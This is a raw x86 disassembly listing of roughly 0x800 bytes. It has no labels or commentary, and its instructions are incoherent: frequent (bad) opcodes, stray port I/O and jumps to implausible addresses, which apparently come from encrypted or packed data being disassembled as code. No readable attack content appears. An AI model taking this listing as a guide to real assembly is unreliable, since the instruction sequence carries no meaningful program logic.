  414ebb:	mov    ds:0x25ec8d10,eax
  414ec0:	and    DWORD PTR [ebp+0x3e],edx
  414ec3:	push   esp
  414ec4:	dec    edi
  414ec5:	xchg   ecx,eax
  414ec6:	add    eax,0x837315de
  414ecb:	jnp    0x414ead
  414ecd:	mov    ecx,0x3f0f0e9a
  414ed2:	fcomi  st,st(7)
  414ed4:	ins    BYTE PTR es:[edi],dx
  414ed5:	retf   0x7909
  414ed8:	jno    0x414f02
  414eda:	mov    eax,ds:0xf60dcc5d
  414edf:	xchg   edi,eax
  414ee0:	ret    
  414ee1:	pop    edi
  414ee2:	repz pop ecx
  414ee4:	sub    esi,DWORD PTR [esi+0x52]
  414ee7:	test   DWORD PTR [eax+esi*4-0x61],0x4becc2f0
  414eef:	repz ror esi,cl
  414ef2:	cmp    BYTE PTR [ecx+0x33],dl
  414ef5:	into   
  414ef6:	push   0x54a7041a
  414efb:	jns    0x414eba
  414efd:	dec    ebp
  414efe:	js     0x414e9a
  414f00:	mov    esp,0x824f10c8
  414f05:	lahf   
  414f06:	aas    
  414f07:	jg     0x414eb0
  414f09:	shr    DWORD PTR [ebp+0xe],cl
  414f0c:	jb     0x414f21
  414f0e:	inc    edi
  414f0f:	sub    DWORD PTR [eax+0x5c6fa35c],0xc0ced0de
  414f19:	cmp    edi,DWORD PTR [ecx+edi*1+0x17]
  414f1d:	pop    ebx
  414f1e:	cmc    
  414f1f:	jno    0x414f58
  414f21:	into   
  414f22:	jge    0x414f9b
  414f24:	mov    dl,0x5
  414f26:	les    edx,FWORD PTR [edx]
  414f28:	cwde   
  414f29:	mov    ds:0x65216fc7,al
  414f2e:	jae    0x414f9b
  414f30:	icebp  
  414f31:	jo     0x414fa2
  414f33:	cmp    ebx,DWORD PTR [edx+0x31]
  414f36:	dec    esi
  414f37:	out    0x82,al
  414f39:	dec    ebx
  414f3a:	fisttp QWORD PTR [ebx]
  414f3c:	sub    DWORD PTR [esi+0x36],ecx
  414f3f:	lods   eax,DWORD PTR ds:[esi]
  414f40:	int3   
  414f41:	nop
  414f42:	or     bh,BYTE PTR [ecx]
  414f44:	pop    esp
  414f45:	rcr    DWORD PTR [ebp-0x14],cl
  414f48:	mov    DWORD PTR [edi],0xeb7ed0b0
  414f4e:	dec    ebp
  414f4f:	les    ebx,FWORD PTR [esi+edi*2]
  414f52:	outs   dx,DWORD PTR ds:[esi]
  414f53:	fidiv  DWORD PTR [eax-0x56]
  414f56:	jae    0x414faf
  414f58:	dec    ecx
  414f59:	xlat   BYTE PTR ds:[ebx]
  414f5a:	sub    BYTE PTR [ebx],dl
  414f5c:	cmp    DWORD PTR [ebx-0x1d],ebp
  414f5f:	or     bh,bh
  414f61:	lea    ebx,[edx-0x3817f729]
  414f67:	sbb    esi,DWORD PTR [eax*4+0x1e02a1a5]
  414f6e:	dec    ecx
  414f6f:	push   es
  414f70:	jecxz  0x414f3f
  414f72:	test   DWORD PTR [ebx],edi
  414f74:	and    BYTE PTR [ecx],0x51
  414f77:	dec    edi
  414f78:	cs cli 
  414f7a:	test   eax,0x353f3bb0
  414f7f:	into   
  414f80:	fwait
  414f81:	xor    BYTE PTR [edx+0x3643b0b],dl
  414f87:	loopne 0x414f52
  414f89:	push   ds
  414f8a:	inc    esp
  414f8b:	int    0xb4
  414f8d:	mov    ah,0xdf
  414f8f:	dec    esi
  414f90:	sub    BYTE PTR [ebx],bl
  414f92:	mov    edx,0x98868052
  414f97:	repz mov ch,0x43
  414f9a:	and    eax,0xa0f8e23
  414f9f:	out    dx,al
  414fa0:	popa   
  414fa1:	arpl   WORD PTR [eax-0x55],di
  414fa4:	sar    dl,1
  414fa6:	mov    gs,WORD PTR [esi-0x70]
  414fa9:	test   dl,dh
  414fab:	push   0xffffffba
  414fad:	add    ch,BYTE PTR [esi]
  414faf:	add    ebx,DWORD PTR [esp+ebx*2]
  414fb2:	push   ebx
  414fb3:	retf   
  414fb4:	xor    DWORD PTR [ecx+0xc],0x44
  414fb8:	fidivr DWORD PTR [ecx-0x4b]
  414fbb:	add    eax,0x133e4b11
  414fc0:	push   esp
  414fc1:	mov    al,ds:0xa0f52385
  414fc6:	mov    ebp,0xd8f94893
  414fcb:	sub    al,0xdf
  414fcd:	mov    dh,0x70
  414fcf:	repnz rcr edi,1
  414fd2:	mov    esi,0x10599461
  414fd7:	cmc    
  414fd8:	adc    al,ah
  414fda:	xor    DWORD PTR [edx+0x3bedf55f],ebp
  414fe0:	(bad)  
  414fe1:	jo     0x41502a
  414fe3:	std    
  414fe4:	fs mov al,0xc1
  414fe7:	inc    esp
  414fe8:	int    0x28
  414fea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414feb:	adc    esp,DWORD PTR [ebx+edi*8+0xdbe53]
  414ff2:	mov    ebx,0xcec68cd9
  414ff7:	jo     0x41504e
  414ff9:	jl     0x415011
  414ffb:	out    dx,eax
  414ffc:	push   ss
  414ffd:	cmp    ah,al
  414fff:	xchg   ebp,eax
  415000:	mov    cl,BYTE PTR [ecx]
  415002:	jae    0x414fb9
  415004:	outs   dx,BYTE PTR ds:[esi]
  415005:	jecxz  0x414fb5
  415007:	pushf  
  415008:	lods   al,BYTE PTR ds:[esi]
  415009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41500a:	sti    
  41500b:	mov    ebp,0xfa7be16f
  415010:	(bad)  
  415011:	sbb    edx,DWORD PTR [edx-0x31662cca]
  415017:	add    al,0x33
  415019:	adc    bh,BYTE PTR [edx+0xc]
  41501c:	std    
  41501d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41501e:	repnz mov dl,BYTE PTR [eax+esi*2-0x3c]
  415023:	mov    edi,0x39824933
  415028:	out    0xbf,eax
  41502a:	fucomip st,st(4)
  41502c:	in     eax,dx
  41502d:	adc    eax,0xedacf833
  415032:	xlat   BYTE PTR ds:[ebx]
  415033:	jmp    0x6e6aa33b
  415038:	in     al,dx
  415039:	jo     0x415086
  41503b:	inc    ebp
  41503c:	jp     0x41502e
  41503e:	mov    bh,bl
  415040:	and    ecx,DWORD PTR [edx+0x75a012d0]
  415046:	xchg   esp,eax
  415047:	in     eax,dx
  415048:	mov    ebp,0x1c5ca35
  41504d:	popa   
  41504e:	outs   dx,DWORD PTR ds:[esi]
  41504f:	mov    esi,0xdd0643fa
  415054:	add    al,0x94
  415056:	fild   QWORD PTR [eax]
  415058:	jmp    DWORD PTR [edi]
  41505a:	mov    ecx,ds
  41505c:	retf   0x2e23
  41505f:	pop    esi
  415060:	xchg   edi,eax
  415061:	arpl   cx,sp
  415063:	inc    eax
  415064:	cmp    bl,BYTE PTR [edx-0x4e]
  415067:	or     DWORD PTR [ecx-0x45b3070],ebp
  41506d:	xor    al,0x16
  41506f:	in     eax,0x91
  415071:	jne    0x4150d7
  415073:	jo     0x4150ee
  415075:	push   0xffffffdc
  415077:	sub    esp,ecx
  415079:	sbb    ebx,0x7b
  41507c:	sub    al,0xf4
  41507e:	xchg   esi,eax
  41507f:	mov    dl,0xe3
  415081:	push   ss
  415082:	xchg   edi,eax
  415083:	cmp    DWORD PTR [edi],ecx
  415085:	and    DWORD PTR [ecx],edi
  415087:	push   edi
  415088:	or     dl,ah
  41508a:	xchg   dh,bl
  41508c:	ret    
  41508d:	jne    0x4150ab
  41508f:	fsub   st(1),st
  415091:	lahf   
  415092:	add    BYTE PTR [eax+0x28cbf1cd],0x28
  415099:	dec    edi
  41509a:	push   edx
  41509b:	mov    edx,0x6c8ee9fd
  4150a0:	xchg   esi,eax
  4150a1:	js     0x415047
  4150a3:	dec    edx
  4150a4:	add    cl,BYTE PTR [ecx-0x5c]
  4150a7:	in     al,0xef
  4150a9:	sbb    ch,BYTE PTR [esi+0x500a6a0]
  4150af:	test   eax,0xd8b9bc06
  4150b4:	lahf   
  4150b5:	cli    
  4150b6:	mov    bh,0xb7
  4150b8:	jae    0x415045
  4150ba:	pop    es
  4150bb:	push   ebx
  4150bc:	je     0x415076
  4150be:	push   cs
  4150bf:	mov    ecx,0x9b21b21d
  4150c4:	add    cl,BYTE PTR [esi]
  4150c6:	popa   
  4150c7:	sub    dl,BYTE PTR [edi+0x301c662d]
  4150cd:	pop    ss
  4150ce:	call   0xb99e232b
  4150d3:	fstp   st(4)
  4150d5:	ret    0xf7e4
  4150d8:	mov    ebx,0x40c6934c
  4150dd:	xor    DWORD PTR [esi],0xd69b6a1
  4150e3:	sub    eax,0x566ab696
  4150e8:	cdq    
  4150e9:	in     eax,0xc4
  4150eb:	inc    ebx
  4150ec:	stos   BYTE PTR es:[edi],al
  4150ed:	lock gs std 
  4150f0:	sub    ah,BYTE PTR [edx+0x31]
  4150f3:	dec    edi
  4150f4:	test   esp,ebx
  4150f6:	pop    ecx
  4150f7:	mov    DWORD PTR [edx],edi
  4150f9:	add    BYTE PTR [ebp-0x12],ah
  4150fc:	enter  0x95ad,0x52
  415100:	mov    ds:0x884ae95c,eax
  415105:	fsubrp st(2),st
  415107:	pop    esp
  415108:	push   edx
  415109:	arpl   WORD PTR [ecx+0x73c25ba8],dx
  41510f:	mov    dh,0x89
  415111:	xor    BYTE PTR [ebp+ecx*8+0x381576bb],ch
  415118:	icebp  
  415119:	push   ecx
  41511a:	cmp    ch,cl
  41511c:	in     al,dx
  41511d:	mov    BYTE PTR [esi-0x52],0x85
  415121:	mov    dl,0xb9
  415123:	pop    esi
  415124:	repz sub al,0xe9
  415127:	adc    eax,0x4e363be6
  41512c:	adc    al,0x3e
  41512e:	xchg   edi,eax
  41512f:	fcom   QWORD PTR [eax+0x3c]
  415132:	xor    al,0xc8
  415134:	loop   0x415106
  415136:	add    DWORD PTR [ebx+0x7724077a],esi
  41513c:	aaa    
  41513d:	jl     0x4150fb
  41513f:	iret   
  415140:	jae    0x4151bb
  415142:	pop    ebp
  415143:	stos   BYTE PTR es:[edi],al
  415144:	pusha  
  415145:	jae    0x4150dc
  415147:	mov    BYTE PTR [ebp-0x9039003],bh
  41514d:	leave  
  41514e:	mov    ch,0xca
  415150:	pop    edx
  415151:	stos   BYTE PTR es:[edi],al
  415152:	out    0xf9,al
  415154:	push   es
  415155:	adc    DWORD PTR [ebp+0x2e1b8e96],edi
  41515b:	outs   dx,DWORD PTR ds:[esi]
  41515c:	pop    eax
  41515d:	pusha  
  41515e:	arpl   WORD PTR [esi-0x7b],sp
  415161:	xchg   ebx,eax
  415162:	sbb    ah,bl
  415164:	jmp    0x6f853255
  415169:	inc    ebx
  41516a:	xor    ch,BYTE PTR [eax+0x6e]
  41516d:	ret    0x4fbf
  415170:	outs   dx,DWORD PTR ds:[esi]
  415171:	xchg   BYTE PTR [eax-0x1a24e2c2],dl
  415177:	das    
  415178:	add    al,0x6d
  41517a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41517b:	out    0x3d,eax
  41517d:	loope  0x415134
  41517f:	retf   
  415180:	popf   
  415181:	mov    ds,ebx
  415183:	sbb    eax,0x1fdff9b3
  415188:	data16 xor ah,BYTE PTR [eax-0x24]
  41518c:	jp     0x4151dc
  41518e:	aaa    
  41518f:	sub    edx,0xffffff89
  415192:	loope  0x415211
  415194:	mov    BYTE PTR [esi],dh
  415196:	adc    ecx,ebp
  415198:	mov    ecx,0x174a651c
  41519d:	jae    0x415161
  41519f:	and    eax,0xb1a1779a
  4151a4:	add    BYTE PTR [esi-0x51d37f2d],al
  4151aa:	push   edi
  4151ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151ac:	cs call 0xb4934dd5
  4151b2:	(bad)  
  4151b3:	cld    
  4151b4:	dec    edx
  4151b5:	sar    dl,0x5e
  4151b8:	scas   al,BYTE PTR es:[edi]
  4151b9:	xchg   ebp,eax
  4151ba:	repz and BYTE PTR [ebp+0x18f6b2b2],0x59
  4151c2:	(bad)  
  4151c3:	fcmovnu st,st(1)
  4151c5:	push   esp
  4151c6:	outs   dx,DWORD PTR ds:[esi]
  4151c7:	int3   
  4151c8:	sbb    ebp,DWORD PTR [ecx-0x25]
  4151cb:	xchg   esp,eax
  4151cc:	bound  edi,QWORD PTR [edx]
  4151ce:	ficom  WORD PTR [ecx]
  4151d0:	icebp  
  4151d1:	and    DWORD PTR [ecx+0x446b4090],0xeb4e0a25
  4151db:	pushf  
  4151dc:	sub    eax,0xffffffe1
  4151df:	shl    DWORD PTR [edx-0x1638e79e],cl
  4151e5:	push   0xbbe52be2
  4151ea:	dec    ecx
  4151eb:	sbb    BYTE PTR [ebp+0x3422c9c8],al
  4151f1:	mov    WORD PTR [ecx-0x41],gs
  4151f4:	loop   0x415262
  4151f6:	jecxz  0x41521e
  4151f8:	push   ss
  4151f9:	sub    ah,BYTE PTR [esi+eax*4-0x24]
  4151fd:	imul   DWORD PTR [ebx+0x7f]
  415200:	jmp    0x4151b3
  415202:	repnz xchg edi,eax
  415204:	mov    esi,0xd93832b6
  415209:	ds jg  0x4151ae
  41520c:	mov    ebx,edi
  41520e:	cmp    eax,0x43fa7755
  415213:	xor    cl,ah
  415215:	xchg   BYTE PTR [ecx+0x4c1bc062],bl
  41521b:	pop    ebp
  41521c:	stc    
  41521d:	enter  0xa7e8,0x3b
  415221:	jb     0x415294
  415223:	data16 idiv BYTE PTR [esi]
  415226:	add    DWORD PTR [ebp+0xc28ecde],ebx
  41522c:	jb     0x415239
  41522e:	jno    0x415273
  415230:	sub    DWORD PTR [ebx-0x2b],eax
  415233:	pop    esp
  415234:	dec    ecx
  415235:	jecxz  0x4151d9
  415237:	or     cl,BYTE PTR [esi+0x4ef4202a]
  41523d:	in     al,0xce
  41523f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415240:	sub    al,0xe0
  415242:	push   ds
  415243:	stos   BYTE PTR es:[edi],al
  415244:	cmp    ebp,DWORD PTR ds:0x340ec542
  41524a:	and    al,0xba
  41524c:	scas   eax,DWORD PTR es:[edi]
  41524d:	cmp    BYTE PTR [ebp-0xfbc73ed],bl
  415253:	outs   dx,BYTE PTR ds:[esi]
  415254:	cmc    
  415255:	scas   al,BYTE PTR es:[edi]
  415256:	xchg   ecx,eax
  415257:	rcr    DWORD PTR [edx+0x64875786],1
  41525d:	mov    dh,0x40
  41525f:	jb     0x415231
  415261:	jne    0x41529f
  415263:	jae    0x415201
  415265:	sub    BYTE PTR [edi-0x27e2a4d9],dh
  41526b:	adc    al,0x54
  41526d:	adc    eax,DWORD PTR [esi]
  41526f:	inc    ebx
  415270:	adc    eax,0xb991fc18
  415275:	div    DWORD PTR [edx]
  415277:	outs   dx,BYTE PTR cs:[esi]
  415279:	push   ss
  41527a:	in     eax,0x66
  41527c:	(bad)  
  41527e:	cvtps2pi mm5,QWORD PTR [edi-0x3b7f5662]
  415285:	(bad)
  41528a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41528b:	leave  
  41528c:	xlat   BYTE PTR ds:[ebx]
  41528d:	adc    eax,0x85537ff7
  415292:	push   cs
  415293:	inc    eax
  415294:	popf   
  415295:	mov    bl,0x9d
  415297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415298:	or     al,0xc8
  41529a:	ret    0x31c0
  41529d:	jecxz  0x415222
  41529f:	dec    edi
  4152a0:	sahf   
  4152a1:	mov    cl,0xc7
  4152a3:	imul   edx,DWORD PTR [eax],0x2
  4152a6:	jl     0x4152da
  4152a8:	icebp  
  4152a9:	and    ecx,DWORD PTR [eax+0x78]
  4152ac:	fistp  QWORD PTR [eax]
  4152ae:	or     DWORD PTR [ebp+0x419140a4],ebp
  4152b4:	daa    
  4152b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152b6:	xchg   edx,eax
  4152b7:	cwde   
  4152b8:	out    dx,eax
  4152b9:	mov    ah,0x57
  4152bb:	stos   BYTE PTR es:[edi],al
  4152bc:	mov    esi,0x9f23152b
  4152c1:	sub    al,0x2a
  4152c3:	div    ah
  4152c5:	ret    
  4152c6:	cmp    eax,ecx
  4152c8:	sub    BYTE PTR [edx-0x333de3af],ch
  4152ce:	das    
  4152cf:	cmp    al,0x8b
  4152d1:	neg    BYTE PTR [edx-0x74]
  4152d4:	pop    edi
  4152d5:	(bad)  [edx-0x1d2bf8da]
  4152db:	int    0x4c
  4152dd:	pop    ds
  4152de:	daa    
  4152df:	leave  
  4152e0:	test   DWORD PTR [edx],0x45bd364a
  4152e6:	mov    esi,0x1f484158
  4152eb:	or     esp,DWORD PTR [eax+0x27]
  4152ee:	jmp    0xe468:0xbdb046a3
  4152f5:	adc    cl,ah
  4152f7:	mov    al,0xcc
  4152f9:	mov    dh,0xab
  4152fb:	mov    edx,DWORD PTR [edx+0x22]
  4152fe:	sub    BYTE PTR [edx],bl
  415300:	jno    0x41536a
  415302:	test   eax,0xd43fb3db
  415307:	xor    BYTE PTR [ebp+0x10369dd7],al
  41530d:	xchg   ebx,eax
  41530e:	mov    ecx,0x2327af
  415313:	in     al,0x4e
  415315:	ss dec esp
  415317:	and    al,0x90
  415319:	xchg   esi,eax
  41531a:	sub    al,0x76
  41531c:	mov    ds:0x8739bfda,al
  415321:	push   0x2134e56f
  415326:	xlat   BYTE PTR ds:[ebx]
  415327:	loop   0x4152e0
  415329:	and    ah,bh
  41532b:	push   0x51bcfddd
  415330:	fcomp  QWORD PTR [esi+eax*4+0x280589a6]
  415337:	je     0x4153b3
  415339:	fcom   QWORD PTR [ebx-0x1f]
  41533c:	pop    ebp
  41533d:	ja     0x415354
  41533f:	sub    ecx,esi
  415341:	xor    eax,0x46fb44fd
  415346:	mov    bh,0x54
  415348:	inc    edx
  415349:	mov    al,0xe3
  41534b:	les    ebx,FWORD PTR [edi+0x326af2f7]
  415351:	mov    edi,0x792ede9f
  415356:	add    DWORD PTR [esi],ecx
  415358:	pop    edi
  415359:	js     0x4152f8
  41535b:	inc    edx
  41535c:	mov    ah,0x84
  41535e:	xor    ecx,DWORD PTR [edx+0x77e077d6]
  415364:	mov    eax,ds:0xfc2d5358
  415369:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41536a:	add    eax,0xc1a8bafb
  41536f:	test   BYTE PTR [eax-0xf],al
  415372:	xor    BYTE PTR [edx+0x2010cab4],dh
  415378:	push   0x9f2a0ca7
  41537d:	cmp    esi,ecx
  41537f:	add    dl,al
  415381:	jnp    0x415351
  415383:	ins    DWORD PTR es:[edi],dx
  415384:	(bad)  
  415385:	cmc    
  415386:	sahf   
  415387:	test   eax,0x332f759d
  41538c:	jle    0x415335
  41538e:	inc    edx
  41538f:	and    DWORD PTR [eax+0x133f72ba],edx
  415395:	and    al,0x99
  415397:	cs jne 0x4153f9
  41539a:	imul   esi,edx,0xb3db8a4c
  4153a0:	or     DWORD PTR [ebp+0x509fb1d],ecx
  4153a6:	dec    esp
  4153a7:	add    bl,ch
  4153a9:	cwde   
  4153aa:	rcl    DWORD PTR [edi+0x26],cl
  4153ad:	(bad)  
  4153ae:	scas   al,BYTE PTR es:[edi]
  4153af:	cmp    al,0x71
  4153b1:	fstp   DWORD PTR [ebp-0x27]
  4153b4:	cmc    
  4153b5:	lock or eax,0xb1812c18
  4153bb:	(bad)  
  4153bc:	mov    dh,0xee
  4153be:	sub    eax,0xc80477c
  4153c3:	xchg   esp,eax
  4153c4:	push   edi
  4153c5:	cmp    DWORD PTR [edi+edx*2-0x3c0fa5a8],0x3e
  4153cd:	mov    ecx,0xfd3510e5
  4153d2:	loopne 0x4153aa
  4153d4:	jl     0x415402
  4153d6:	mov    ch,BYTE PTR [bx+si]
  4153d9:	jl     0x415426
  4153db:	pop    ss
  4153dc:	mov    bh,0x51
  4153de:	mov    ch,0x9f
  4153e0:	mov    ch,BYTE PTR [ecx]
  4153e2:	push   edx
  4153e3:	popa   
  4153e4:	cmp    DWORD PTR ds:0x955bb9d3,edx
  4153ea:	test   eax,0xeb6a6a84
  4153ef:	mov    dh,0xc
  4153f1:	cmc    
  4153f2:	pusha  
  4153f3:	les    ebx,FWORD PTR [edi]
  4153f5:	jl     0x415390
  4153f7:	call   0xe79e0488
  4153fc:	or     BYTE PTR [ecx+0x1d],ah
  4153ff:	pop    esp
  415400:	into   
  415401:	in     eax,0x6a
  415403:	sar    DWORD PTR [eax-0x44],0x13
  415407:	out    dx,eax
  415408:	shl    DWORD PTR [ebx+0x4f],0x6a
  41540c:	inc    edx
  41540d:	pop    esi
  41540e:	push   ss
  41540f:	mov    ecx,0x1fc7df42
  415414:	aaa    
  415415:	pop    ds
  415416:	neg    DWORD PTR [edi+edi*4]
  415419:	pop    esp
  41541a:	jbe    0x415431
  41541c:	dec    ebp
  41541d:	sub    ecx,ebp
  41541f:	xlat   BYTE PTR ds:[ebx]
  415420:	cmc    
  415421:	dec    ebx
  415422:	xchg   DWORD PTR [eax-0x3cc27518],esp
  415428:	inc    esp
  415429:	pop    ss
  41542a:	fucomi st,st(0)
  41542c:	shr    eax,cl
  41542e:	inc    ebx
  41542f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415430:	div    DWORD PTR [edx*1+0x38aff7da]
  415437:	push   eax
  415438:	push   ds
  415439:	les    eax,FWORD PTR [ecx-0x5d]
  41543c:	aam    0xba
  41543e:	fnstsw WORD PTR [ebx]
  415440:	sub    al,0x0
  415442:	and    al,0xfa
  415444:	or     eax,0x76b67d50
  415449:	jg     0x4153eb
  41544b:	gs jge 0x41549b
  41544e:	les    edi,FWORD PTR ds:0x46e26481
  415454:	push   es
  415455:	retf   
  415456:	rcl    DWORD PTR ds:0x4cc3c074,0xb8
  41545d:	xchg   esi,eax
  41545e:	dec    ebx
  41545f:	pop    ebp
  415460:	outs   dx,BYTE PTR ds:[esi]
  415461:	push   cs
  415462:	imul   eax,DWORD PTR [ebp-0x36],0xffffffb5
  415466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415467:	sbb    ah,bh
  415469:	dec    edi
  41546a:	push   DWORD PTR [edx+0x4d576608]
  415470:	dec    edx
  415471:	ss xchg ecx,eax
  415473:	or     BYTE PTR [esi+0x52ea335c],0x9a
  41547a:	mov    al,0x13
  41547c:	cld    
  41547d:	adc    esi,DWORD PTR [ecx-0x69]
  415480:	sbb    ebp,DWORD PTR [ecx+0x72]
  415483:	and    DWORD PTR [edx+0x59451a2a],eax
  415489:	cmp    BYTE PTR [esi],bh
  41548b:	sbb    BYTE PTR [eax],dh
  41548d:	clc    
  41548e:	pop    ecx
  41548f:	into   
  415490:	jmp    0x41550b
  415492:	xchg   BYTE PTR [ecx],cl
  415494:	mov    cl,0x4f
  415496:	fwait
  415497:	adc    ebp,esi
  415499:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41549a:	popa   
  41549b:	call   0x1d03:0x4200c723
  4154a2:	arpl   WORD PTR [edx],cx
  4154a4:	call   0x77a371d
  4154a9:	adc    ah,bl
  4154ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4154ac:	lock repz cmp eax,DWORD PTR [ebx-0x4fb20905]
  4154b4:	mov    bl,0xff
  4154b6:	sub    BYTE PTR [edi-0x1c],bh
  4154b9:	rol    BYTE PTR [edi],cl
  4154bb:	add    BYTE PTR [ebx],bl
  4154bd:	popf   
  4154be:	mov    esp,0xd0b12f6
  4154c3:	push   esi
  4154c4:	popf   
  4154c5:	push   ebp
  4154c6:	imul   esi,esi,0x77
  4154c9:	pushf  
  4154ca:	out    dx,eax
  4154cb:	cmp    BYTE PTR [edx-0x439f26b3],0x76
  4154d2:	(bad)  
  4154d3:	mov    bl,0x10
  4154d5:	inc    ebp
  4154d6:	mov    DWORD PTR [ebp-0x63],esi
  4154d9:	out    dx,eax
  4154da:	fld    TBYTE PTR ds:0xf50bbd27
  4154e0:	loopne 0x415542
  4154e2:	lahf   
  4154e3:	cld    
  4154e4:	das    
  4154e5:	mov    ch,0x32
  4154e7:	push   ss
  4154e8:	push   cs
  4154e9:	dec    ebx
  4154ea:	inc    esp
  4154eb:	test   dh,ah
  4154ed:	xor    ch,bl
  4154ef:	jmp    0xc7569037
  4154f4:	inc    edi
  4154f5:	xor    eax,0x42a65d8b
  4154fa:	js     0x4154b0
  4154fc:	ds (bad) 
  4154ff:	or     cl,cl
  415501:	ds xor al,0x38
  415504:	dec    esi
  415505:	xor    eax,ebp
  415507:	test   eax,0xd783f58b
  41550c:	aam    0xaa
  41550e:	(bad)  
  41550f:	jecxz  0x41551f
  415511:	(bad)  
  415512:	adc    esp,DWORD PTR [esi+eax*1]
  415515:	jmp    0x41553c
  415517:	out    dx,al
  415518:	cmp    ebp,DWORD PTR [edi+0x6a]
  41551b:	fisttp QWORD PTR [eax+eax*1+0x1cbe430a]
  415522:	mov    ?,WORD PTR ds:0x96104ddb
  415528:	push   edx
  415529:	mov    WORD PTR [ecx-0xefa9573],?
  41552f:	or     ebp,DWORD PTR [esi-0x1]
  415532:	fistp  WORD PTR ds:0x8f1b717a
  415538:	jmp    0x41555e
  41553a:	sub    BYTE PTR [eax-0x4d],bh
  41553d:	jo     0x4154e4
  41553f:	mov    al,ds:0x260f97ab
  415544:	pop    DWORD PTR [esi-0x1e23dfa0]
  41554a:	cwde   
  41554b:	call   0x1f94a10e
  415550:	and    eax,0xfe26cb9a
  415555:	push   ebx
  415556:	add    DWORD PTR [esi-0x552cf379],ecx
  41555c:	lods   eax,DWORD PTR ds:[esi]
  41555d:	ins    DWORD PTR es:[edi],dx
  41555e:	sub    al,0xf
  415560:	loopne 0x415502
  415562:	dec    eax
  415563:	mov    eax,0x1eb230d6
  415568:	mov    ds,WORD PTR [eax]
  41556a:	sbb    DWORD PTR [edx+ebx*4],esp
  41556d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41556e:	fcos   
  415570:	shl    edx,1
  415572:	jmp    0x5d30:0x8f9959f7
  415579:	xor    al,0x50
  41557c:	sub    eax,0x6d24f67e
  415581:	rol    BYTE PTR [ebx],1
  415583:	fstp   QWORD PTR [esi]
  415585:	xchg   BYTE PTR [eax-0x59],al
  415588:	xor    esi,DWORD PTR [ecx+ebp*2-0x4e8123ae]
  41558f:	mov    ds:0xde41231,al
  415594:	sbb    BYTE PTR [ecx+ebx*8+0x5a],0x81
  415599:	sub    al,0xe5
  41559b:	adc    bh,bh
  41559d:	sbb    esp,DWORD PTR [ebx+0x21bd6704]
  4155a3:	imul   ebx,DWORD PTR es:[ecx+ebp*4],0xbe8020c1
  4155ab:	pop    ebp
  4155ac:	or     edx,DWORD PTR ds:0xf0872896
  4155b2:	setne  BYTE PTR [bp+si-0x20]
  4155b7:	sub    DWORD PTR [esi],0xffffffe6
  4155ba:	sbb    BYTE PTR [eax-0x5869ebc6],cl
  4155c0:	mov    BYTE PTR [ebp-0x14],0x74
  4155c4:	arpl   dx,sp
  4155c6:	or     DWORD PTR [eax-0x10],edi
  4155c9:	call   0x7b9ce840
  4155ce:	or     esi,DWORD PTR [edx+ecx*4+0x18]
  4155d2:	pusha  
  4155d3:	outs   dx,BYTE PTR ds:[esi]
  4155d4:	add    dl,BYTE PTR [edi-0x4c]
  4155d7:	pop    ecx
  4155d8:	repnz cmp ebp,edi
  4155db:	and    bl,ch
  4155dd:	ds pop ecx
  4155df:	aaa    
  4155e0:	pop    es
  4155e1:	mov    esp,0x6fb73cf4
  4155e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155e7:	mov    edx,0x9ac9b2fd
  4155ec:	ror    BYTE PTR [eax+0x1462f835],0x4c
  4155f3:	or     BYTE PTR [ebp+0x707655e],ch
  4155f9:	clc    
  4155fa:	fwait
  4155fb:	lods   al,BYTE PTR ds:[esi]
  4155fc:	dec    ecx
  4155fd:	mov    WORD PTR [edx+eiz*4],?
  415600:	push   edx
  415601:	sti    
  415602:	(bad)  
  415603:	jns    0x41565d
  415605:	push   0x9c92e281
  41560a:	sub    DWORD PTR [eax+0xbf2a754],eax
  415610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415611:	adc    al,0x7f
  415613:	mov    ebp,0xc342217a
  415618:	mov    ebp,0x866ec593
  41561d:	ins    BYTE PTR es:[edi],dx
  41561e:	push   ebp
  41561f:	or     bh,ch
  415621:	jbe    0x4155cd
  415623:	idiv   BYTE PTR [esi]
  415625:	ins    DWORD PTR es:[edi],dx
  415626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415627:	(bad)  
  415628:	or     eax,0x151746f1
  41562d:	into   
  41562e:	mov    eax,0x1a273838
  415633:	imul   edx,DWORD PTR [ebx],0x7b79d34a
  415639:	sub    BYTE PTR [eax-0x72],bl
  41563c:	xchg   ebp,eax
  41563d:	jo     0x4156a2
  41563f:	shr    BYTE PTR [edi+0x3c172755],0x41
  415646:	gs into 
  415648:	je     0x415634
  41564a:	pushf  
  41564b:	inc    ecx
  41564c:	das    
  41564d:	pop    ebx
  41564e:	add    eax,0xd0201bb8
  415653:	mov    dh,0x29
  415655:	xor    al,0x14
  415657:	mov    ds:0xc7e0e4f8,al
  41565c:	gs pusha 
  41565e:	mov    bh,BYTE PTR [ebx]
  415660:	call   0x8401:0x611a2ee9
  415667:	mov    eax,ds:0x53bed837
  41566c:	gs pop ebp
  41566e:	test   ah,dl
  415670:	inc    ebx
  415671:	imul   eax,DWORD PTR [ecx+0x31],0x60
  415675:	mov    WORD PTR [esi+0x28a66785],es
  41567b:	sar    DWORD PTR [esi+0x7d3f2b5b],cl
  415681:	jmp    0x415665
  415683:	fs popa 
  415685:	xchg   BYTE PTR [esi-0x7772113c],dl
  41568b:	sbb    esi,esi
  41568d:	mov    ds:0x9dae42dd,al
  415692:	adc    ecx,DWORD PTR [ecx-0x44]
  415695:	push   ds
  415696:	enter  0xd8b7,0x7a
  41569a:	je     0x415716
  41569c:	daa    
  41569d:	and    edi,ebp
